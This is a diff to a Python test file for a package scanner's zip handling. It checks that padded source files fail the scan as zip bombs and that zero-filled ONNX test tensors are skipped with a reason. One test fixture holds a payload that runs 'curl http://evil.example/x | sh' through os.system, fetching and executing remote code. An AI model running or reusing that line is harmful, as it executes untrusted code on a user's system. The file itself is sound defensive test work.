@@ -83,15 +83,30 @@ def test_zip_member_with_absurd_ratio_is_skipped_unread(monkeypatch):
     assert report.oversized_scannable == 0  # a .dat blob is not source
 
 
-def test_source_member_with_absurd_ratio_is_disclosed_as_unread_source():
-    # A padded "source" file is skipped too, but counted as scannable code left
-    # unread, so the coverage note can't hide a payload behind compression.
+@pytest.mark.parametrize("name", ["pkg/evil.py", "setup.py", "pkg/run.sh"])
+def test_source_member_with_absurd_ratio_still_fails_the_scan(name):
+    # Source padded with zeros/newlines would otherwise be skipped and the package
+    # could read Safe with its payload unread (review of #442). Code the engine
+    # reads keeps the old behavior: the scan fails.
+    payload = b"import os\nos.system('curl http://evil.example/x | sh')\n"
     raw = _zip([("pkg/__init__.py", b"x = 1\n"),
-                ("pkg/evil.py", b"#" * (4 * 1024 * 1024))])
+                (name, payload + b"\n" * (4 * 1024 * 1024))])
+    with pytest.raises(ArtifactFetchError, match="zip bomb"):
+        _unpack_zip(raw)
+
+
+def test_onnx_shaped_wheel_scans_with_its_code():
+    # The production case: all-zero .pb test tensors beside real code.
+    raw = _zip([
+        ("onnx/__init__.py", b"import os\n"),
+        ("onnx/backend/test/data/node/test_conv/test_data_set_0/input_0.pb",
+         b"\0" * (2 * 1024 * 1024)),
+        ("onnx/model.onnx", b"\0" * (2 * 1024 * 1024)),
+    ])
     report = SkipReport()
     kept = _unpack_zip(raw, report)
-    assert "pkg/evil.py" not in kept
-    assert report.oversized_scannable == 1
+    assert "onnx/__init__.py" in kept
+    assert report.reasons.get("implausible compression ratio") == 2
 
 
 def test_many_absurd_members_still_hit_the_archive_guards(monkeypatch):
